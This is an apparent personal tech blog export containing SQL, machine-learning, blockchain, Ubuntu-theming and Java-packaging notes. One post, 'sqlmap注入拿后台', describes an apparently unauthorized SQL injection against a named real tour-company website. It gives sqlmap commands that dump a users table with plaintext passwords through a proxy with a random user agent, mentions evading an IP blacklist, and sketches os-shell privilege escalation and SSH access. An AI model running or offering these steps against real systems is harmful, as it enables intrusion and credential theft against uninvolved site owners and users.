* 计算笛卡尔积 * 选出左B=右B的元组，不等的不算，忽略掉 * 合并该元组，成为新元组 A B C D E ，成为新元组的只有两组 1 a 3 1 3 3 c 7 2 7 ## SQL相关 自然连接 nature join 和join using(某个属性) 并运算：union 自动去重 union all 可以保留重复 交运算：intersect 自动去重 intersect all 可保留重复 差运算：except 自动去重 except all 可保留重复 聚集函数：sum, min , max , count , avg分组聚集： group by中没有出现的属性，只要是出现在select中，必须在聚集函数内部的形式出现,比如b,c没出现在group by 内部，用例： 1select a,avg(b),sum(c) from table1 group by a; 集合成员资格：in ,not in集合比较：some运算,用例 123456select ID from instructor where salary &gt;some (select salary from instructor where department = 'bio');等价于select distinct T.ID from instructor as T,instructor as S where S.department ='bio' and T.salary &gt;S.salary; 空关系测试：exists, not exists,测试子查询结果中是否存在元组，用例： 1234567DSC黑书第六版中的，“找出选修了bio系开设的所有课程的学生”（表在官网select S.ID,S.name from student as S where not exists( (select course_id from course where dep_name = 'bio')//找出bio系开设的所有课程 except (select T.course_id from takes as T where S.ID = T.ID) );//找出S.ID选修的所有课程 重复元组存在性测试：unique，测试子查询返回集合是否有重复元组，无则返回true；not unique则相反 1234DSC黑书第六版中的，“找出所有在2019年最多开设一次的课程”select C.course_id from course as Cwhere unique (select S.course_id from section as S where C.course_id =S.course_id and S.year =2019); 标量子查询：子查询只返回包括【单个属性】的【单个元组】，只可以出现在select where having三种子句中 关系代数","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"笔试","slug":"笔试","permalink":"http://waynamigo.github.io/tags/笔试/"}]},{"title":"统计学习笔记","slug":"2020-09-12-statics_note","date":"2020-09-10T16:00:00.000Z","updated":"2021-07-16T13:40:15.137Z","comments":true,"path":"2020/09/11/2020-09-12-statics_note/","link":"","permalink":"http://waynamigo.github.io/2020/09/11/2020-09-12-statics_note/","excerpt":"该笔记是对李航统计学习方法和All of Statics做的学习笔记，简单进行相关算法实验，加强理解，查缺补漏等，内容尽量精炼","text":"该笔记是对李航统计学习方法和All of Statics做的学习笔记，简单进行相关算法实验，加强理解，查缺补漏等，内容尽量精炼 概念生成模型与判别模型generative model和discriminative model$（以下分别表示为G和D）$$G\\ $常见的有朴素贝叶斯，隐马尔科夫模型，高斯混合、 LDA、 Restricted Boltzmann Machine等$D\\ $有Kmeans，感知机，决策树，最大熵模型，Logistic回归、SVM、 boosting、条件随机场、神经网络等两者的本质区别及特点：$G\\ $的流程是学习X和Y的联合概率分布$P(x,y)$得出$P(y|x)$最直接的例子就是Naive Bayes，由于生成的结果是联合分布$P(x,y)$，可以计算边缘分布$P(x)$进行异常值检测，若$P(x)$太小，就判定可能不适合这一类样本所代表的数据。$D\\ $的流程是直接由给定的X，Y学习决策函数或$P(y|x)$，是一种黑盒操作，准确率高，可以将允许对问题进行抽象处理，最熟悉的例子就是Neural Network 分类问题和回归问题分类用CrossEntropy，回归用Mean Square Error等等 范数 norm$L1范数 \\sum{|x_i|}$$L2范数 \\sqrt{x_{1}^{2} + x_{2}^{2} + … + x_{n}^{2}}$$L_\\infty无穷范数MAX{|x_i|}$范数理论推论$L1\\geq{L2\\geq{L_\\infty}}$对于numpy的线性代数库，有几种求范数的方法，主要就是求这三种 1np.linalg.norm(x, ord=None, axis=None, keepdims=False) axis=0表示对矩阵x的每一列求范数，axis=1表示对矩阵的每一行求范数， keeptdims=True表示结果保留维度，keepdims=False表示结果不保留维度 最小二乘是解决曲线拟合问题、最小化cost的优化方法，使求得的数据与实际数据之间的误差平方和最小，应用范围非常广泛。$设(x,y)为一组观测量，x=[x_0,x_1,…,x_n]^T,寻找一个函数y=f(x,w)$ ，使$尽可能逼近曲线(x,y),其中w=[w_0,w_1,…,w_n]^T$，为待估计参数，求解使残差函数$$L(y,f(x,w))=\\sum{[y_i-f(x_i,w_i)]^2}$$得到全局最小值的$w$,直观上就是每个点与拟合曲线的欧氏距离的平方和。 与梯度下降的区别：最小二乘法是指对$\\Delta$求导找出函数全局最小的w，梯度下降是先给定一个w（初始化），经过N次梯度下降后找到的使函数局部最小的w。相对的，梯度下降适用于大规模数据，最小二乘适用于较小样本，不过梯度下降的缺点是到最小点的时候收敛速度变、对初始点的选择极为敏感两个方面。 感知机 perceptron属于$Discriminative \\ Model$的线性分类模型，输入是表示一个Instance的特征向量，求出分离特征的超平面，公式表示为：$f(x) = sign(w*x+b)$$\\begin{eqnarray}sign(x)= \\begin{cases}1,&amp;x\\geq{0} \\cr-1 ,&amp;x&lt;0\\end{cases}\\end{eqnarray}$这种perceptron叠起来就相当于是全连接的MLP(Multi-Layer Perceptron) n多个线性函数叠加，对应矩阵运算$W\\cdot x + B$，$W是w权重矩阵，B是bias的列向量，激活函数对应单个感知机的sign函数$ k-近邻 k nearest neighbor还是属于$Discriminative \\ Model$的模型，复杂度为$O(n^2)$，由三个基本要素组成：距离度量、k值、分类规则距离度量，设有向量x1和x2，则：欧氏距离np.sqrt(np.sum(np.square(x1 - x2)))或直接np.linalg.norm(x1-x2)（用numpy的线性代数库求L2范数，但后者较慢）曼哈顿距离np.sum(x1 - x2) 123456789input:px,kreturn:bestx# get N(x):涵盖最近的k个点的邻域，即KListdistList = []for x in X: distList.append(np.sqrt(np.sum(np.square(px - x))))KList = np.argsort(np.array(distList))[:k]# 决策规则I:由KList得出bestx，以类别分类问题为例，选N(x)最多类别为结果X(np.argmax(np.bincount(X(i)))) 如果要求多个最大值索引np.where(a == np.amax(a))[0]，或者np.argwhere(a == np.amax(a)) kd tree存储k维空间数据的树结构，实现如下 1伪码写好了（？），但是按手里的数据感觉不太好写，回头看看别人有没有demo，先摸了 朴素贝叶斯 Naive Bayes属于$Generative \\ Model$一类，给的是联合分布$P(x,y)$，学过概率论的应该都会，普通的算法实现如下： 1234567891011121314151617181920212223242526272829303132333435input:先验概率分布P__y : P(Y=c)，条件概率分布P_x_y : P(X=x|Y=c)，dim_f:特征维度c_num：分类数目，data:数据list，label:标签list，以[0,1,...,9]为例return:max P#求出先验分布，并对数化，经常使用的对乘法处理的方式P__y = [[(np.sum(label == np.asarray(i)))/(len(label))] \\ for i in range(c_num)]P__y = np.log(P__y)#求出条件分布P_x_y = np.zeros((c_num, dim_f, 2)) #对标记集进行遍历 for i in range(len(label)): #获取当前循环所使用的标记 c = label[i] #获取当前要处理的样本 x = data[i] #对该样本的每一维feature进行遍历 for j in range(dim_f): #先在矩阵中对应位置加1 P_x_y[c][j][x[j]] += 1 for c in range(c_num): for j in range(dim_f): P_x_y0 = P_x_y[c][j][0] P_x_y1 = P_x_y[c][j][1] P_x_y[c][j][0] = np.log((P_x_y0 + 1) / (P_x_y0 + P_x_y1 + 2)) P_x_y[c][j][1] = np.log((P_x_y1 + 1) / (P_x_y0 + P_x_y1 + 2))# pick up最大ProbabilityP = [0] * c_numfor i in range(c_num): for j in range(dim_f): sum += P_x_y[i][j][x[j]] P[i] = sum + P__y[i] res = P.index(np.amax(P)) 决策树 Decision Tree 及剪枝决策树是经常在kaggle以及实际应用中很广泛且有效的算法，决策树通常包括3个步骤:特征选择、构造、剪枝，无内鬼，直接进行一个sklearn.tree的import，sklearn的tree里封装了BaseDecisionTree，在此基础上进一步封装了DecisionTreeClassifier和DecisionTreeRegressor：分类器和回归器，做kaggle是确实好用。 特征选择：特征选择的准则是信息增益（information gain）或信息增益比。$设离散型X的概率分布P(X =x_i)=p_i$$Entropy的定义为H(X)=\\sum{p_i\\log{p_i}}$ 决策树构造ID3各个节点用信息增益H(D)准则选择特征，递归构建决策树。ID3算法的核心是在决策树各个结点上应用信息增益准则选择特征，递归地构建决策树。具体方法是：从根结点（root node）开始，对结点计算所有可能的特征的信息增益， 选择信息增益最大的特征作为结点的特征，由该特征的不同取值建立子结点；再对子结点递归调用该方法，直到所有feature被用完或剩余feature的信息增益很小或少于自己设置的阈值，决策树建立完成，缺点是只生成了树，没有【】容易过拟合。 C4.5各个节点用信息增益比选择特征，递归构建决策树，递归函数流程和ID3一样，只是评估标准换成了H(D|A) CART对回归树用平方最小误差原则，对分类树用基尼指数最小化原则进行特征选择。 剪枝去掉过于细分的叶结点，使其回退到父结点，甚至更高的结点，然后将父结点或更高的结点改为新的叶结点。 但是自己还是得从0实现一个决策树，以后用的时候心里有点B数。数据用colab的sampledata里california_housing那个 12 Logistic Regression熟悉的Logistic回归，以二分类任务为例，就是用sigmoid函数把结果映射到(-1,1)；多分类任务下，将该二分类任务的sigmoid推广到了softmax函数 ，就是我们熟悉的softmax激活函数。$$Sigmoid(z) = \\frac{1}{1+exp(-z)},z=w^T\\cdot x,(alias\\ Sigmoid(z)=h_w(x))$$$$gradient\\ descent:\\Delta = x_i \\cdot y_i - \\frac{np.exp(w\\cdot x_i) * x_i)}{ ( 1 + np.exp(w\\cdot x_i))}then, \\ w=w+lr\\cdot\\Delta$$或者$$LikelihoodFunc:J(w) =-\\frac{1}{m}\\sum\\limits_{i=1}^{m}{[y_ilog(h_w(x_i))+(1-y_i)log(1-h_w(x_i))]}$$ $$partial:\\frac{\\partial J\\left(w \\right)}{\\partial {w}}=\\frac{1}{m}\\sum\\limits_{i=1}^{m}{(h_w(x_i)-{y_i})x_i}$$代码例子 123456789101112131415#gradient descentx = data # feature array,default(n,m), gradient dimension is my = label # result/ ground truthw = np.zeros(x.shape[1])iter_num = 1000lr = 1e-4for one_iter in range(iter_num): for index in len(data): # 下面xiyi赋值是看着方便，实际上用的时候直接用index取list元素 x_i = data[index] y_i = label[index] # 用上面的公式，求partial gradient = x_i*(1/(1+np.exp(np.dot(w,x_i)))-y_i) w+=gradient*lrprint(\"final w:\",w) 最大熵模型 Max Entropy Model复杂度超高，做分类慢的一批，一般用来衡量预测效果的好坏，其实一般也不用。主要是记录一下最大熵模型的思想：将分类等问题作为约束最优化问题，下面的SVM和Adaboost等算法都是采用的约束最优化思想完成的。 支持向量机 Support Vector Machines间隔最大化的学习策略，可形式化为求解凸二次规划问题/正则化的合页损失函数的最小化问题训练数据线性可分，通过硬间隔最大化（hard margin maximization）学习线性可分SVM/硬间隔SVM数据近似线性可分，通过软间隔最大化（soft margin maximization）学习线性SVM/软间隔SVM数据线性不可分时，通过核函数+软间隔最大化，学习非线性SVM：核函数表示将输入从输入空间映射到特征空间得到的特征向量的内积(点乘)，可以抽象成在高维空间里学习一个线性SVM 线性SVM函数间隔、约束最优化问题 函数间隔：对于给定数据和超平面wx+b：关于样本点(x,y)的函数间隔为$\\gamma_f=y(wx+b)$关于数据集的函数间隔为，所有样本点的最小值，$\\gamma_{min}=min(\\gamma_f)$ 几何间隔：归一化函数间隔，在法向量正向的几何间隔为$\\gamma_g=y(\\frac{w}{||w||}\\cdot{x}+\\frac{b}{||w||}),其中||w||是法向量w的L_2范数$两者关系是$\\gamma_f=\\gamma_g*||w||$ 间隔最大化，我们为使SVM分类样本点的置信度更大，需要将超平面关于数据集的几何间隔最大化，即求最大几何间隔的超平面，数学描述为：$$max\\ \\frac{\\gamma_f}{||w||}\\\\ s.t.\\ y(wx+b)\\geq \\gamma_{min}$$由于等式两边在尺度上是一致的，用一下无敌的“不妨设”$\\gamma_f = 1$，那么优化目标为w的L2范数的最小值，即$$max\\ \\frac{\\gamma_f}{||w||}等价于求\\min{\\frac{||w||^2}{2}}\\\\ s.t.\\ y(wx+b)\\geq{1}$$那么这个转化为二次规划的非线性规划如何求解呢？使用拉格朗日对偶性求解对偶问题得到以上问题的解，以这个线性可分问题为例，引入N个拉格朗日乘子，$\\alpha$，对应N维特征和N维法向量w：$$构建拉格朗日函数L(w,b,\\alpha)=\\frac{||w||^2}{2}-\\sum\\limits_{i=1}^N{\\alpha_iy_i(wx_i+b)}+\\sum\\limits_{i=1}^N{\\alpha_i}$$原始问题的对偶问题转化为$\\max\\limits_{\\alpha}\\min\\limits_{w,b}L,下面推导一下$Derivatives:$$\\frac{\\partial{L(w,b,\\alpha)}}{\\partial{w}}=w-\\sum\\limits_{i=1}^N{\\alpha_ix_iy_i}=0\\\\ \\frac{\\partial{L(w,b,\\alpha)}}{\\partial{b}}=\\sum\\limits_{i=1}^N{\\alpha_iy_i}=0$$Then we turn to:$$max:L(w,b,\\alpha)=\\sum\\limits_{i=1}^N{\\alpha_i}-\\frac{1}{2}\\sum\\limits_{i,j=1}^N{y_iy_j\\alpha_i\\alpha_jx_i^Tx_j}\\\\ s.t\\ \\sum\\limits_{i=1}^N{\\alpha_iy_i}=0$$ 这化简为只有拉格朗日乘子alpha的L极大值问题了，到这一步，我们可以直接进行SMO求解（从这里可以直接跳到下一节）于是我们可以引入软间隔的线性SVM，对每个样本点引进一个松弛变量$\\xi\\geq0$，再引进一个惩罚参数C，那么我们的问题由$求min\\frac{||w||^2}{2}转化为min(\\frac{||w||^2}{2}+C\\sum\\limits_{i=1}^N{\\xi_i})$$$L(w,b,\\xi,\\alpha,\\mu)=\\frac{||w||^2}{2}+C\\sum\\limits_{i=1}^N{\\xi_i}-\\sum\\limits_{i=1}^N{\\alpha_iy_i(wx_i+b)}+\\sum\\limits_{i=1}^N{\\alpha_i(1-\\xi_i)}-\\sum\\limits_{i=1}^N{\\mu_i\\xi_i},\\\\s.t.\\ y(wx+b)\\geq1-\\xi,\\xi\\geq0$$Derivatives:$$\\frac{\\partial{L}}{\\partial{w}}=w-\\sum\\limits_{i=1}^N{\\alpha_ix_iy_i}=0\\\\\\frac{\\partial{L}}{\\partial{b}}=-\\sum\\limits_{i=1}^N{\\alpha_iy_i}=0\\\\\\frac{\\partial{L}}{\\partial{\\xi_i}}=C-\\alpha_i-\\mu_i=0$$以上求出关于$w,b,\\xi$的极小后turn to :$$max:L(w,b,\\xi,\\alpha,\\mu)=\\sum\\limits_{i=1}^N{\\alpha_i}-\\frac{1}{2}\\sum\\limits_{i,j=1}^N{y_iy_j\\alpha_i\\alpha_jx_i^Tx_j}\\\\s.t.\\ \\sum\\limits_{i=1}^N{\\alpha_iy_i}=0,\\\\C-\\alpha_i-\\mu_i=0$$由以上结果可以看出，如果将目标函数的max转化为求min(改正负号)，均得到对应的对偶问题，其满足KKT条件，经过求解对偶问题，得出alpha，带入解得w和b，$$w=\\sum\\limits_{i=1}^N{\\alpha_ix_iy_i}\\\\b=y_j-\\sum\\limits_{i=1}^N{}y_i\\alpha_i(x_ix_j)$$即得到超平面，wx+b=0以上两种线性的SVM可以直接由上面的推导将一个求最大间隔的原始问题转化为求一个超平面的对偶问题，进而求得 非线性SVM核函数用来将两个样本点实例$x,z$通过映射函数$\\Phi(x),\\Phi(z)$从输入空间映射到特征空间内，核函数表示为K，即$K(x,z)=\\Phi(x)^T\\Phi(z)$，一般不写出映射函数$\\Phi$，而是在Kernel函数中隐式给出：在这记录一下高斯核Gaussian kernel(radial basis function,RBF kernel):$$K(x,z)=exp(-\\frac{||x-z||^2}{2\\sigma^2})$$和sigmoid核：$$K(x,z)=tanh(ax^Tz+c)\\\\ tanh(b)=\\frac{1-e^{-2b}}{1+e^{-2b}}$$“SVM with a sigmoid kernel is equivalent to a 2-layer perceptron”，一个结论，显式的证明就不用写了，其实在看到拉格朗日乘子alpha时，我们就可以直观的联想到拉格朗日乘子相当于感知机场景下对feature的权重。 序列最小最优化算法，sequential minimal optimization,SMO alg.引入核函数的非线性转化为线性（甚至是可分）的凸二次规划问题：$$\\min\\limits_{\\alpha}:\\frac{1}{2}\\sum\\limits_{i,j=1}^N{y_iy_j\\alpha_i\\alpha_jx_i^Tx_j}-\\sum\\limits_{i=1}^N{\\alpha_i},\\\\s.t.\\ \\sum\\limits_{i=1}^N{\\alpha_iy_i}=0$$非线性引入Gaussian核的SVM实现如下： 1def SVM(): 概念补充supprot vector:线性不可分情况下，对偶问题的解$\\alpha=(a_1,a_2…a_N)^T中a_i对应的样本点(x_i,y_i)就是支持向量。$凸优化问题：设$f:F\\rightarrow{R}为$凸函数，则求$\\min\\limits_{x\\in{F}}{f(x)}为$凸优化问题凸优化有如下几个定理 123凸优化任意局部最优解即全局最优解凸优化最优解集为凸集若函数f为非空凸集上的严格凸函数，且凸优化问题存在全局最优解，那么全局最优解唯一 在条件$f_i(x)\\leq0,1,a_i^T\\cdot x = b_i$最小化$f_0(x)$，凸集指一个集合空间内部两点间连线所覆盖的点都在集合空间内，凸二次规划（convex quadratic programming）指目标函数为凸二次函数，形如$$min f(x)= \\frac{1}{2}x^TQx+C^Tx,\\\\s.t.\\ Ax\\leq{b}，其每一行对应一个约束$$Karush-Kuhn-Tucker condition:$\\alpha_i\\geq{0}\\\\y_i(wx_i+b)\\geq{1}\\\\\\alpha_i(y_i(w_ix+b)-1)=0$","categories":[{"name":"数学","slug":"数学","permalink":"http://waynamigo.github.io/categories/数学/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"数学","slug":"数学","permalink":"http://waynamigo.github.io/tags/数学/"}]},{"title":"Solidity编写smart contract的demo","slug":"2019-07-22-blockchain","date":"2019-07-21T16:00:00.000Z","updated":"2021-07-20T01:57:41.447Z","comments":true,"path":"2019/07/22/2019-07-22-blockchain/","link":"","permalink":"http://waynamigo.github.io/2019/07/22/2019-07-22-blockchain/","excerpt":"暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是http://talk.strangeai.pro（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾）","text":"暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是http://talk.strangeai.pro（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾） eth文档solidity文档 测试网络RinkebyRinkeby是以太坊官方提供的测试网络，使用PoA共识机制PoA流程 12345678910111213创世块中指定一组初始授权的signers,所有地址保存在创世区块(Genesis Block),并且把该区块的hash写到钱包里。启动挖矿后, 该组signers开始对生成的block进行签名并广播签名结果保存在区块头的Extra字段中Extra中更新当前高度已授权的所有signers的地址,因为有新加入或踢出的signer每一高度都有一个signer处于IN-TURN状态, 其他signer处于OUT-OF-TURN状态, IN-TURN的signer签名的block会立即广播, OUT-OF-TURN的signer签名的block会延时一段时间后再广播, 保证IN-TURN的签名block有更高的优先级上链如果需要加入一个新的signer,signer通过API接口发起一个proposal, 该proposal通过复用区块头 Coinbase(新signer地址)和Nonce(&quot;0xffffffffffffffff&quot;) 字段广播给其他节点. 所有已授权的signers对该新的signer进行&quot;加入&quot;投票, 如果赞成票超过signers总数的50%, 表示同意加入如果需要踢出一个旧的signer, 所有已授权的signers对该旧的signer进行&quot;踢出&quot;投票, 如果赞成票超过signers总数的50%, 表示同意踢出 Soliditycode请稍等","categories":[{"name":"Solidity","slug":"Solidity","permalink":"http://waynamigo.github.io/categories/Solidity/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"blockchain","slug":"blockchain","permalink":"http://waynamigo.github.io/tags/blockchain/"},{"name":"Solidity","slug":"Solidity","permalink":"http://waynamigo.github.io/tags/Solidity/"}]},{"title":"sqlmap注入拿后台","slug":"2019-07-15-sqlmap-1","date":"2019-07-14T16:00:00.000Z","updated":"2021-07-20T01:56:56.217Z","comments":true,"path":"2019/07/15/2019-07-15-sqlmap-1/","link":"","permalink":"http://waynamigo.github.io/2019/07/15/2019-07-15-sqlmap-1/","excerpt":"本文过程中无破坏性操作对于这种php的无防站，直接用sqlmap+msf就可以拿。对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录","text":"本文过程中无破坏性操作对于这种php的无防站，直接用sqlmap+msf就可以拿。对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录 先找后台（这位老哥直接在右上角放了链接）http://hesselgravetours.com/event.php?tourID=1721 check databases1sqlmap -u http://****tours.com/event.php?tourID=1721 --dbs --proxy socks5://127.0.0.1:1080 --random-agent check tables1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent check columns1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent dump 1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent 可见没经过加密。。如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如https://www.cmd5.com/） 后续不贴了。防御太低有好几种方法找到路进行提权 因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧 继续用sqlmap –os-shell提权，第一次没有找到上传点 后台找到这个admin/documents/clients_recordview.php 插 入 服 务 器提示是：ssh -o HostKeyAlgorithms=+ssh-dss content@hesselgravetours.com 密码是***图片不贴了 明天读一下https://arxiv.org/pdf/1502.01852.pdf","categories":[{"name":"渗透","slug":"渗透","permalink":"http://waynamigo.github.io/categories/渗透/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"},{"name":"web","slug":"web","permalink":"http://waynamigo.github.io/tags/web/"},{"name":"sqlmap","slug":"sqlmap","permalink":"http://waynamigo.github.io/tags/sqlmap/"},{"name":"msf","slug":"msf","permalink":"http://waynamigo.github.io/tags/msf/"}]},{"title":"部分MACOS风格的ubuntu","slug":"2019-07-09-我的ubuntu设置界面风格","date":"2019-07-08T16:00:00.000Z","updated":"2021-07-20T01:56:15.575Z","comments":true,"path":"2019/07/09/2019-07-09-我的ubuntu设置界面风格/","link":"","permalink":"http://waynamigo.github.io/2019/07/09/2019-07-09-我的ubuntu设置界面风格/","excerpt":"记录一下以防以后电脑崩了还得重新配,感觉撑不住了","text":"记录一下以防以后电脑崩了还得重新配,感觉撑不住了 效果这样 123456789101112sudo apt-get install gnome-tweak-tool#extensions.gnome.org install [ User themes] #www.gnome-look.org [ gtk-3 themes:McOS-HS]tar -zxvf McOS-HS-2-themes.tar.gz#go to tweaks and chose this themetar -zxvf macOS11.tar.xz #extensions.gnome.org [dash-to-dock]#www.gnome-look.org [OSX.for.Dash.to.DOCK]#www.gnome-look.org [Icon Themes: macOS icons]# extensioons.gnome.org [blyr] go to tweaks and choose them cd ./OSX.for.Dash.to.DOCK/Dock Settings/ 12345678gsettings set org.gnome.shell.extensions.dash-to-dock show-apps-at-top truegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-running-dots falsegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-customize-running-dots falsegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-shrink falsegsettings set org.gnome.shell.extensions.dash-to-dock transparency-mode DEFAULT 12345#www.gnome-look.org [GDM themes:SetAsWallpaper]mv ubuntu.css /usr/share/gnome-shell/theme/sudo mv /usr/share/gnome-shell/extensions/ubuntu-dock@ubuntu.com ~/ upgrade后锁屏界面恢复的问题SetAsWallpaper里的ubuntu.css 更改到/usr/share/gnome-shell/theme/下，并把壁纸更换就ok了，因为upgrade的时候会更新gnome，theme会重新从源下载覆盖","categories":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"},{"name":"tweak","slug":"tweak","permalink":"http://waynamigo.github.io/tags/tweak/"}]},{"title":"用了个bash手动打包java项目并在tomcat中运行","slug":"2019-07-03-经管同学的tomcat项目","date":"2019-07-02T16:00:00.000Z","updated":"2019-07-25T06:55:36.544Z","comments":true,"path":"2019/07/03/2019-07-03-经管同学的tomcat项目/","link":"","permalink":"http://waynamigo.github.io/2019/07/03/2019-07-03-经管同学的tomcat项目/","excerpt":"觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下。（佛了，为什么不用maven","text":"觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下。（佛了，为什么不用maven jdbc和tomcat和手写的DAO，怀旧。用idea打包： 先是在idea里面配置的Webapplication的archive，里面要选一个WEB-INF和META-INF。 将avaliavle elements进行put into outputroot操作，左边的out layout栏里，出现META-INFbuild project 再 build artifacts 好了但是报错了，不知道为啥，war包导出来了，tomcat运行出错。。nmd 项目结构这样 12345678910111213141516171819├── bin│ └── out.jar├── build│ └── source.txt├── build.sh├── classdesign.war├── out│ ├── artifacts│ └── production├── src│ ├── com│ └── MANIFEST.MF└── web ├── commom ├── css ├── iconfont ├── images ├── js └── WEB-INF 然后手动打包了，（写了个循环shellfor javac）代码在这 1234567891011121314151617181920212223242526272829303132#!/usr/bin/bash#写到source，做个list，或者直接用idea生成source.txt也可以path=$(pwd)dependence()&#123;for file in `ls $1|grep -v \".bak\"` do if [ -d $1\"/\"$file ] then dependence $1\"/\"$file else local file_path=$1\"/\"$file if echo $file_path|grep \"MANIFEST.MF\"&gt;/dev/null;then c=c else echo $file_path &gt;&gt; $path/build/source fi fi done&#125;dependence $path/srclibs=\"\"for java_lib in $(ls $path/web/WEB-INF/lib);doif [[ libs != \"\" ]];thenlibs=$libs:$path/web/WEB-INF/lib/$java_libelselibs=$path/web/WEB-INF/lib/$java_libfidonejavac -encoding utf-8 -Xlint:unchecked -d $path/build -classpath $path/web/WEB-INF/lib @$path/build/sourcejar cvf $path/src/MANIFEST.MF $path/bin/classdesign.war ./* 把war烤到webapps执行startup.sh就可以运行了","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/tags/java/"},{"name":"tomcat","slug":"tomcat","permalink":"http://waynamigo.github.io/tags/tomcat/"},{"name":"bash","slug":"bash","permalink":"http://waynamigo.github.io/tags/bash/"}]},{"title":"机器学习考试","slug":"2019-06-25-machinelearning","date":"2019-06-24T16:00:00.000Z","updated":"2021-07-20T01:52:47.659Z","comments":true,"path":"2019/06/25/2019-06-25-machinelearning/","link":"","permalink":"http://waynamigo.github.io/2019/06/25/2019-06-25-machinelearning/","excerpt":"统 计 学 习真正的统计学习笔记待更新，包括李航统计学习方法和All of Statics两本，","text":"统 计 学 习真正的统计学习笔记待更新，包括李航统计学习方法和All of Statics两本， 题型选择 3分×9简答题 5分×5综合分析 7分×7 绪论，回归 按学习方式分类的机器学习算法 四类 模型评估指标：泛化误差、经验误差 欠拟合和过拟合（避免过拟合的方法 正则化-L2、dropout等） 分类和聚类和回归的区别 12回归和分类本质相同，都是根据训练集（有标签，有监督学习）做预测，区别是输出不同，分类是定性输出，回归是定量输出聚类是无监督学习，产生多个集合，单个集合中的元素属性相似 多元线性回归求解权重w的方法：最小二乘、梯度下降、误差函数 非线性回归如何进行计算:通过中间函数映射 岭回归的特点（简答？ LDA 应该有大题 LDA结构，LDA生成文档D的步骤（简答 使用LDA的目的：得到文章库中每篇文章的主题分布； 得到新输入文章的主题分布。 决策树 随机森林 支持向量机 决策树是一种有监督的分类方法,它用已有的数据构造出一棵树,再用这棵树对新的数据进行预测。 学习过程：通过对训练样本的分析来确定“划分属性”（即内部结点所对应的属性） 预测过程：将测试示例从根结点开始，沿着划分属性所构成的“判定测试序列”下行，直到叶结点。 决策树（简答） 1234567891构造过程：特征选择；决策树生成；剪枝（预剪枝和后剪枝的方法）是自根到叶的递归过程2生成停止条件当前结点包含的样本全属于同一类别，无需划分;当前属性集为空, 或是所有样本在所有属性上取值相同，无法划分;当前结点包含的样本集合为空，不能划分.3预剪枝：在构造树的过程中，对每个结点在划分前进行估计，如果当前结点的划分不能带来决策树模型泛化性能的提升，则不对当前结点进行划分并且将当前结点标记为叶结点。后剪枝：先把整颗决策树构造完毕，自底向上对非叶结点进行考察，若将该结点对应的子树换为叶结点能够带来泛化性能的提升，则把该子树替换为叶结点。（预剪后剪的对比） 对节点划分的方法 信息增益 增益率 基尼指数 12信息增益=△信息熵，信息熵越小纯度越大根据基尼指数：选取划分后使基尼指数最小的属性 随机森林（简答） 12345678原始训练集为D,应用Bootstrap法有放回地随机抽取k个新的自助样本集,并由此构建k 棵决策树每棵树最大限度地生长,不做任何修剪将生成的多棵决策树组成随机森林,用随机森林分类器对新的数据进行判别与分类,森林中的每一棵树都对新的数据进行预测和投票,最终得票最多的分类项即为随机森林对该数据的预测结果。优点：随机森林对于高维数据集的处理能力比较好,它可以处理成千上万的输入变量,并确定最重要的变量,因此被认为是一个不错的降维方法。此外,该模型能够输出变量的重要性程度,这是一个非常便利的功能。在对缺失数据进行估计时,随机森林是一个十分有效的方法。就算存在大量的数据缺失,随机森林也能较好地保持精确性。当存在分类不平衡的情况时,随机森林能够提供平衡数据集误差的有效方法。缺点：随机森林给人的感觉像是一个黑盒子———你几乎无法控制模型内部的运行,只能在不同的参数和随机种子之间进行尝试,从而得到一个更优的分类器。 支持向量机 12概念：基本模型定义为特征空间上的间隔最大的线性分类器（按监督学习方式对数据进行二分类的广义线性分类器）决策边界是对学习样本求解的最大边距超平面 间隔，最大间隔 超平面的距离计算（可能考计算 r = |w.T·x+b|/|w| 核方法 设计核函数（综合题）根据mercer定理：若一个对称函数所对应的核矩阵半正定，那么它可以设为核函数神经网络 kmeans 结构 